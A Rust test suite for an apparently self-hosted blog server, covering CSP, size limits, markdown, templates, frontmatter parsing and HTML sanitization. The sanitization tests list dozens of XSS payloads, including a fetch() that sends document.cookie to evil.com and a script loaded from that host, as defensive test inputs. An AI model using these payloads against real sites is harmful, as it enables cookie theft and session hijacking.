use super::*;
use crate::template::TemplateEngine;
use std::collections::HashMap;

#[test]
fn a_bad_socks_address_is_fatal_before_relays_are_configured() {
    let mut config = Config::default();
    assert!(matches!(
        startup_socks(&config),
        Ok(crate::nostr::RelaySocks::Direct)
    ));
    config.nostr.socks = "   ".to_string();
    assert!(matches!(
        startup_socks(&config),
        Ok(crate::nostr::RelaySocks::Direct)
    ));
    config.nostr.socks = "127.0.0.1:9050".to_string();
    assert!(matches!(
        startup_socks(&config),
        Ok(crate::nostr::RelaySocks::Proxy(addr)) if addr == "127.0.0.1:9050".parse().unwrap()
    ));
    config.nostr.socks = "not-a-socket".to_string();
    assert!(matches!(startup_socks(&config), Err(())));
}

#[test]
fn csp_keeps_the_tab_on_this_host() {
    let policy = content_security_policy();
    assert!(policy.contains("connect-src 'self';"));
    assert!(policy.contains("script-src 'self' 'wasm-unsafe-eval'"));
    assert!(!policy.contains("unsafe-inline"));
    assert!(!policy.contains("wss:"));
    assert!(!policy.contains("damus.io"));
    assert!(policy.contains("default-src 'self'"));
    assert!(policy.contains("img-src 'self' https: http: data:"));
    assert!(policy.contains("style-src 'self'"));
    assert!(!policy.contains("style-src 'self' https:"));
}

#[test]
fn the_json_limit_fits_a_sealed_note_and_the_server_is_unnamed() {
    let config = Config::default();
    let payload = crate::seal::sealed_payload_max(
        config.limits.title_max_length,
        config.limits.alias_max_length,
        config.limits.content_max_length,
    );
    assert!(json_body_limit(&config) >= payload + PUBLISH_JSON_OVERHEAD);
    let mut wide = config;
    wide.limits.content_max_length = 256_000;
    let full = crate::seal::sealed_payload_max(128, 32, 256_000);
    assert!(json_body_limit(&wide) >= full + PUBLISH_JSON_OVERHEAD);
    assert!(json_body_limit(&wide) > 1024 * 1024);
    assert_eq!(server_ident().as_str(), None);
}

#[test]
fn test_markdown_rendering_basic() {
    let input = "This is *bold* text and **italic** text.";
    let output = parser::render_markdown(input);
    // Basic test - the actual implementation needs proper regex
    assert!(output.contains("bold"));
    assert!(output.contains("italic"));
}

#[test]
fn test_content_length_validation() {
    let short_content = "a".repeat(100);
    let long_content = "a".repeat(35000);

    assert!(short_content.len() <= 32000);
    assert!(long_content.len() > 32000);
}

#[test]
fn test_template_engine_basic() {
    use std::fs;
    use tempfile::tempdir;

    let dir = tempdir().unwrap();
    let template_content = "<h1>{{title}}</h1><p>{{content}}</p>";
    fs::write(dir.path().join("test.html"), template_content).unwrap();

    let engine = TemplateEngine::new(dir.path().to_str().unwrap());
    let mut context = HashMap::new();
    context.insert("title".to_string(), "Test Title".to_string());
    context.insert("content".to_string(), "Test content".to_string());

    let result = engine.render("test", &context).unwrap();
    assert_eq!(result, "<h1>Test Title</h1><p>Test content</p>");
}

#[test]
fn test_markdown_bold_formatting() {
    let input = "This is **bold** text and more **bold text**.";
    let output = parser::render_markdown(input);
    assert!(output.contains("<strong>bold</strong>"));
    assert!(output.contains("<strong>bold text</strong>"));
}

#[test]
fn test_markdown_code_formatting() {
    let input = "Here is `inline code` and more `code`.";
    let output = parser::render_markdown(input);
    // Note: Our current simple implementation doesn't handle this yet
    // This test documents expected behavior
    assert!(output.contains("inline code"));
}

#[test]
fn test_content_sanitization() {
    let malicious_content = "<script>alert('xss')</script>";
    let sanitized = ammonia::clean(malicious_content);
    assert!(!sanitized.contains("<script>"));
    assert!(!sanitized.contains("alert"));
}

#[test]
fn test_title_and_author_sanitization() {
    let malicious_title = "<script>alert('xss')</script>Safe Title";
    let sanitized_title = parser::strip_tags(&malicious_title);
    assert_eq!(sanitized_title, "Safe Title");

    let malicious_author = "<b>Bold</b><script>alert('xss')</script>John Doe";
    let sanitized_author = parser::strip_tags(&malicious_author);
    assert_eq!(sanitized_author, "BoldJohn Doe");

    let clean_text = "Normal Title";
    let sanitized_clean = parser::strip_tags(&clean_text);
    assert_eq!(sanitized_clean, "Normal Title");

    let various_tags = "<h1>Title</h1><p>Content</p><script>alert('xss')</script>";
    let sanitized_various = parser::strip_tags(&various_tags);
    assert_eq!(sanitized_various, "TitleContent");
}

#[test]
fn test_xss_attack_vectors() {
    let xss_test_cases = [
        "<script>alert('XSS')</script>",
        "<script>alert(1)</script>",
        "<script src='http://evil.com/xss.js'></script>",
        "<script>console.log('test')</script>",
        "<SCRIPT>alert('XSS')</SCRIPT>",
        "<script>alert(document.cookie)</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>fetch('//evil.com?c='+document.cookie)</script>",
        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
        "<script>alert`1`</script>",
        "<img src=x onerror=alert('XSS')>",
        "<img src=x onerror=alert(1)>",
        "<img src='x' onerror='alert(1)'>",
        "<img src=\"x\" onerror=\"alert('XSS')\">",
        "<img/src='x'/onerror='alert(1)'>",
        "<img src=x:alert(1) onerror=eval(src)>",
        "<img src='x' onerror='javascript:alert(1)'>",
        "<IMG SRC=javascript:alert('XSS')>",
        "<img src=`x` onerror=alert(1)>",
        "<img src=x a='' onerror=alert(1)>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<iframe onload=alert('XSS')>",
        "<svg onload=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<div onmouseover=alert(1)>test</div>",
        "<button onclick=alert(1)>Click</button>",
        "<svg><script>alert(1)</script></svg>",
        "<svg><animate onbegin=alert(1)>",
        "<svg><a xlink:href='javascript:alert(1)'><text>XSS</text></a></svg>",
        "<math><mtext></mtext><script>alert(1)</script></math>",
        "<form><button formaction=javascript:alert(1)>Click",
        "<object data='javascript:alert(1)'>",
        "<embed src='javascript:alert(1)'>",
        "<iframe src='javascript:alert(1)'>",
        "<link rel='stylesheet' href='javascript:alert(1)'>",
        "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "<script>\u{0061}lert(1)</script>",
        "<script>ale\u{0072}t(1)</script>",
        "javascript:alert(1)",
        "javascript&#58;alert(1)",
        "javascript&#x3A;alert(1)",
        "<a href='javascript:alert(1)'>Click</a>",
        "<a href='jav&#x09;ascript:alert(1)'>Click</a>",
        "<img src='x' onerror='&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;'>",
    ];

    for (i, xss_payload) in xss_test_cases.iter().enumerate() {
        let sanitized = parser::strip_tags(xss_payload);
        let lower = sanitized.to_lowercase();
        assert!(
            !lower.contains("<script"),
            "Test case {}: contains <script: {}",
            i + 1,
            sanitized
        );
        assert!(
            !lower.contains("onerror"),
            "Test case {}: contains onerror: {}",
            i + 1,
            sanitized
        );
        assert!(
            !lower.contains("onload"),
            "Test case {}: contains onload: {}",
            i + 1,
            sanitized
        );
        assert!(
            !lower.contains("onclick"),
            "Test case {}: contains onclick: {}",
            i + 1,
            sanitized
        );
        assert!(
            !lower.contains("onfocus"),
            "Test case {}: contains onfocus: {}",
            i + 1,
            sanitized
        );
        assert!(
            !lower.contains("onmouseover"),
            "Test case {}: contains onmouseover: {}",
            i + 1,
            sanitized
        );
        assert!(
            !lower.contains("<iframe"),
            "Test case {}: contains <iframe: {}",
            i + 1,
            sanitized
        );
        assert!(
            !lower.contains("<img"),
            "Test case {}: contains <img: {}",
            i + 1,
            sanitized
        );
        assert!(
            !lower.contains("<svg"),
            "Test case {}: contains <svg: {}",
            i + 1,
            sanitized
        );
    }

    let mixed_payload = "Hello <script>alert('XSS')</script> World";
    let sanitized_mixed = parser::strip_tags(&mixed_payload);
    assert_eq!(sanitized_mixed, "Hello  World");

    let title_with_xss = "My Blog Post <img src=x onerror=alert(1)>";
    let sanitized_title = parser::strip_tags(&title_with_xss);
    assert_eq!(sanitized_title, "My Blog Post ");

    let dangerous_payloads = [
        ("<script>alert('XSS')</script>", ""),
        ("<img src=x onerror=alert(1)>", ""),
        ("Safe Title <script>evil()</script>", "Safe Title "),
        ("<svg onload=alert(1)>", ""),
        ("Author <iframe src='javascript:alert(1)'>", "Author "),
        (
            "This is a very long title that should be truncated",
            "This is a very long title that should be truncated",
        ),
    ];

    for (payload, expected) in dangerous_payloads {
        let result = parser::strip_tags(payload);
        assert_eq!(result, expected, "Failed for payload: {}", payload);
    }
}

#[test]
fn test_character_limits() {
    // Test title length limit
    let long_title = "a".repeat(150);
    assert!(long_title.len() > 128);

    // Test content length limit
    let long_content = "a".repeat(130000);
    assert!(long_content.len() > 128000);

    // Test valid lengths
    let valid_title = "a".repeat(50);
    let valid_content = "a".repeat(50000);
    assert!(valid_title.len() <= 128);
    assert!(valid_content.len() <= 128000);
}

#[test]
fn test_truncation_with_200_characters() {
    let emoji_content = "🎯".repeat(200);
    assert_eq!(emoji_content.chars().count(), 200);

    let description = pages::post_description(&emoji_content);

    assert_eq!(description.chars().count(), 163);
    assert!(description.ends_with("..."));
    assert!(description.starts_with("🎯"));

    let random_content = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".repeat(4);
    let random_content = &random_content[..200];
    assert_eq!(random_content.chars().count(), 200);

    let description2 = pages::post_description(random_content);

    assert_eq!(description2.chars().count(), 163);
    assert!(description2.ends_with("..."));

    let short_content = "🌟".repeat(50);
    assert_eq!(short_content.chars().count(), 50);

    let description3 = pages::post_description(&short_content);

    assert_eq!(description3.chars().count(), 50);
    assert!(!description3.ends_with("..."));
}

#[test]
fn test_date_parsing_from_file() {
    // Test legacy format parsing
    let file_content = "January 15, 2024 | Test Author\n\n# Test Post\nThis is test content";
    let result = parse_legacy_frontmatter(file_content).unwrap();
    let (title, author, created_at, raw_content) = result;

    assert_eq!(title, "Test Post");
    assert_eq!(author, "Test Author");
    assert_eq!(
        created_at.format("%B %d, %Y").to_string(),
        "January 15, 2024"
    );
    assert_eq!(raw_content, "This is test content");

    let file_content_no_author = "March 22, 2023\n\n# Test Post\nContent";
    let result = parse_legacy_frontmatter(file_content_no_author).unwrap();
    let (title, author, created_at, raw_content) = result;

    assert_eq!(title, "Test Post");
    assert_eq!(author, "");
    assert_eq!(created_at.format("%B %d, %Y").to_string(), "March 22, 2023");
    assert_eq!(raw_content, "Content");

    // Test YAML frontmatter parsing
    let yaml_content =
        "---\ntitle: My YAML Post\ndate: 2024-01-15\nauthor: John Doe\n---\n\nThis is YAML content";
    let result = parse_yaml_frontmatter(yaml_content).unwrap();
    let (title, author, created_at, raw_content) = result;

    assert_eq!(title, "My YAML Post");
    assert_eq!(author, "John Doe");
    assert_eq!(created_at.format("%Y-%m-%d").to_string(), "2024-01-15");
    assert_eq!(raw_content, "This is YAML content");

    let yaml_no_author = "---\ntitle: No Author Post\ndate: 2023-03-22\n---\n\nContent here";
    let result = parse_yaml_frontmatter(yaml_no_author).unwrap();
    let (title, author, created_at, raw_content) = result;

    assert_eq!(title, "No Author Post");
    assert_eq!(author, "");
    assert_eq!(created_at.format("%Y-%m-%d").to_string(), "2023-03-22");
    assert_eq!(raw_content, "Content here");

    let yaml_file =
        "---\ntitle: Auto Detected\ndate: 2024-06-01\nauthor: Auto\n---\n\nAuto content";
    assert!(yaml_file.starts_with("---\n"));
    let result = parse_yaml_frontmatter(yaml_file).unwrap();
    assert_eq!(result.0, "Auto Detected");

    let legacy_file = "June 01, 2024 | Legacy Author\n\n# Legacy Title\nLegacy content";
    assert!(!legacy_file.starts_with("---\n"));
    let result = parse_legacy_frontmatter(legacy_file).unwrap();
    assert_eq!(result.0, "Legacy Title");
}

#[test]
fn test_yaml_frontmatter_sanitization() {
    // XSS in title
    let yaml = "---\ntitle: <script>alert('xss')</script>Clean Title\ndate: 2024-01-15\nauthor: <img src=x onerror=alert(1)>Safe Author\n---\n\nContent";
    let result = parse_yaml_frontmatter(yaml).unwrap();
    assert_eq!(result.0, "Clean Title");
    assert!(!result.0.contains("<script>"));
    assert_eq!(result.1, "Safe Author");
    assert!(!result.1.contains("<img"));
}

#[test]
fn test_yaml_frontmatter_edge_cases() {
    let no_close = "---\ntitle: Test\ndate: 2024-01-15\nContent without closing";
    assert!(parse_yaml_frontmatter(no_close).is_none());

    let empty_fm = "---\n\n---\n\nContent";
    let result = parse_yaml_frontmatter(empty_fm).unwrap();
    assert_eq!(result.0, "Untitled");
    assert_eq!(result.1, "");
    assert_eq!(result.3, "Content");

    let extra_fields = "---\ntitle: Test\ndate: 2024-01-15\nauthor: Author\nbackground: red\nflagged: true\n---\n\nContent";
    let result = parse_yaml_frontmatter(extra_fields).unwrap();
    assert_eq!(result.0, "Test");
    assert_eq!(result.1, "Author");
    assert_eq!(result.3, "Content");

    let content_with_dashes = "---\ntitle: Dashes Test\ndate: 2024-01-15\n---\n\nSome content\n---\nMore content after dashes";
    let result = parse_yaml_frontmatter(content_with_dashes).unwrap();
    assert_eq!(result.0, "Dashes Test");
    assert_eq!(result.3, "Some content\n---\nMore content after dashes");

    let spaced = "---\ntitle:   Spaced Title  \ndate:  2024-01-15  \nauthor:   Spaced Author  \n---\n\nContent";
    let result = parse_yaml_frontmatter(spaced).unwrap();
    assert_eq!(result.0, "Spaced Title");
    assert_eq!(result.1, "Spaced Author");

    let no_blank = "---\ntitle: No Blank\ndate: 2024-01-15\n---\nContent directly";
    let result = parse_yaml_frontmatter(no_blank).unwrap();
    assert_eq!(result.0, "No Blank");
    assert_eq!(result.3, "Content directly");
}

#[test]
fn test_template_context_building() {
    let mut context = HashMap::new();
    context.insert("title".to_string(), "Test Title".to_string());
    context.insert("content".to_string(), "Test Content".to_string());

    assert_eq!(context.get("title").unwrap(), "Test Title");
    assert_eq!(context.get("content").unwrap(), "Test Content");
    assert!(context.get("missing").is_none());
}

#[test]
fn test_date_formatting() {
    let now = Utc::now();
    let formatted = now.format("%B %d, %Y").to_string();

    // Basic validation that the format works
    assert!(formatted.len() > 10); // Should be a reasonable length
    assert!(!formatted.contains("UTC")); // Should not contain time info
    assert!(!formatted.contains("at")); // Should not contain time info
}

#[test]
fn test_date_format_output() {
    let now = Utc::now();
    let formatted = now.format("%B %d, %Y").to_string();

    // Should be format like "May 1, 2024" (shortest) or "January 15, 2024" (longer)
    assert!(formatted.len() >= 11); // At least "May 1, 2024" length
    assert!(formatted.contains(", "));
    assert!(!formatted.contains("UTC"));
    assert!(!formatted.contains(":"));

    // Example: "March 15, 2024" (no time, no timezone)
}

#[test]
fn test_empty_input_validation() {
    assert!("".trim().is_empty());
    assert!("   ".trim().is_empty());
    assert!(!"hello".trim().is_empty());
    assert!(!"  hello  ".trim().is_empty());
}

#[test]
fn test_ammonia_configuration() {
    // Test that ammonia is properly configured for our use case
    let safe_html = "<strong>Bold</strong> and <em>italic</em>";
    let cleaned = ammonia::clean(safe_html);
    assert!(cleaned.contains("<strong>"));
    assert!(cleaned.contains("<em>"));

    let unsafe_html = "<script>alert('xss')</script><strong>Safe</strong>";
    let cleaned_unsafe = ammonia::clean(unsafe_html);
    assert!(!cleaned_unsafe.contains("<script>"));
    assert!(cleaned_unsafe.contains("<strong>Safe</strong>"));
}

#[test]
fn test_alias_field_validation() {
    // Test valid alias field
    let valid_alias = "John Doe";
    assert!(valid_alias.len() <= 32);

    // Test alias at character limit
    let max_alias = "a".repeat(32);
    assert_eq!(max_alias.len(), 32);

    // Test alias over character limit
    let over_limit_alias = "a".repeat(33);
    assert!(over_limit_alias.len() > 32);

    // Test empty alias (should be allowed as it's optional)
    let empty_alias = "";
    assert!(empty_alias.is_empty());
}

#[test]
fn test_title_character_limit() {
    // Test valid title at limit
    let max_title = "a".repeat(128);
    assert_eq!(max_title.len(), 128);

    // Test title over limit
    let over_limit_title = "a".repeat(129);
    assert!(over_limit_title.len() > 128);

    // Test normal title
    let normal_title = "A Great Article Title";
    assert!(normal_title.len() <= 128);
}

#[test]
fn test_static_page_template_rendering() {
    use std::fs;
    use tempfile::tempdir;

    // Create temporary directory for templates
    let temp_dir = tempdir().unwrap();
    let template_path = temp_dir.path().join("post.html");

    // Create a minimal template that includes all the variables used in static pages
    let template_content = r#"<html>
<head><title>{{title}}</title></head>
<body>
<h1>{{title}}</h1>
<div class="meta">{{author_display}}{{created_at}}</div>
<div class="content">{{content}}</div>
</body>
</html>"#;

    fs::write(&template_path, template_content).unwrap();

    // Test the template engine with the same context that static pages use
    let engine = TemplateEngine::new(temp_dir.path().to_str().unwrap());
    let mut context = HashMap::new();
    context.insert("title".to_string(), "Test Page".to_string());
    context.insert("content".to_string(), "<p>Test content</p>".to_string());
    context.insert("created_at".to_string(), "October 5, 2025".to_string());
    context.insert("author".to_string(), String::new());
    context.insert("author_display".to_string(), String::new());
    context.insert("created_at_iso".to_string(), String::new());
    context.insert("url".to_string(), "/test".to_string());
    context.insert("description".to_string(), String::new());

    let result = engine.render("post", &context).unwrap();

    // Verify no template variables remain unreplaced
    assert!(!result.contains("{{"));
    assert!(!result.contains("}}"));

    // Verify content is properly rendered
    assert!(result.contains("<title>Test Page</title>"));
    assert!(result.contains("<h1>Test Page</h1>"));
    assert!(result.contains("<p>Test content</p>"));
    assert!(result.contains("October 5, 2025"));
}

#[test]
fn test_all_static_pages_template_variables() {
    use std::fs;
    use tempfile::tempdir;

    // Create temporary directory for templates
    let temp_dir = tempdir().unwrap();
    let template_path = temp_dir.path().join("post.html");

    // Create a template that uses all variables that could appear in static pages
    let template_content = r#"<html>
<head>
<title>{{title}}</title>
<meta property="og:title" content="{{title}}" />
<meta property="og:url" content="{{url}}" />
<meta property="og:description" content="{{description}}" />
<meta property="article:author" content="{{author}}" />
<meta property="article:published_time" content="{{created_at_iso}}" />
<meta name="author" content="{{author}}" />
</head>
<body>
<h1>{{title}}</h1>
<div class="article-meta">{{author_display}}{{created_at}}</div>
<div class="article-content">{{content}}</div>
</body>
</html>"#;

    fs::write(&template_path, template_content).unwrap();

    let engine = TemplateEngine::new(temp_dir.path().to_str().unwrap());

    // Test each static page type
    let pages = vec!["markup", "legal", "about", "api"];

    for page_name in pages {
        let mut context = HashMap::new();
        context.insert("title".to_string(), format!("{} Page", page_name));
        context.insert("content".to_string(), "<p>Test content</p>".to_string());
        context.insert("created_at".to_string(), "October 5, 2025".to_string());
        context.insert("author".to_string(), String::new());
        context.insert("author_display".to_string(), String::new());
        context.insert("created_at_iso".to_string(), String::new());
        context.insert("url".to_string(), format!("/{}", page_name));
        context.insert("description".to_string(), String::new());

        let result = engine.render("post", &context).unwrap();

        // Verify no template variables remain unreplaced
        assert!(
            !result.contains("{{"),
            "Page {} has unreplaced template variables",
            page_name
        );
        assert!(
            !result.contains("}}"),
            "Page {} has unreplaced template variables",
            page_name
        );

        // Verify basic structure
        assert!(result.contains(&format!("<title>{} Page</title>", page_name)));
        assert!(result.contains(&format!("<h1>{} Page</h1>", page_name)));
        assert!(result.contains("October 5, 2025"));
    }
}

#[test]
fn bundled_pages_copy_when_missing_and_do_not_overwrite() {
    use std::fs;

    let temp = tempfile::tempdir().unwrap();
    let pages = temp.path().join("pages");
    let content = temp.path().join("content");
    fs::create_dir(&pages).unwrap();
    fs::write(pages.join("about.md"), "bundled about").unwrap();
    fs::write(pages.join("notes.txt"), "ignore me").unwrap();

    let installed = install_bundled_pages_from(&pages, &content).unwrap();
    assert_eq!(installed, vec!["about.md".to_string()]);
    assert_eq!(
        fs::read_to_string(content.join("about.md")).unwrap(),
        "bundled about"
    );
    assert!(!content.join("notes.txt").exists());

    fs::write(content.join("about.md"), "local edit").unwrap();
    fs::write(pages.join("legal.md"), "bundled legal").unwrap();
    let installed = install_bundled_pages_from(&pages, &content).unwrap();
    assert_eq!(installed, vec!["legal.md".to_string()]);
    assert_eq!(
        fs::read_to_string(content.join("about.md")).unwrap(),
        "local edit"
    );
    assert_eq!(
        fs::read_to_string(content.join("legal.md")).unwrap(),
        "bundled legal"
    );
}
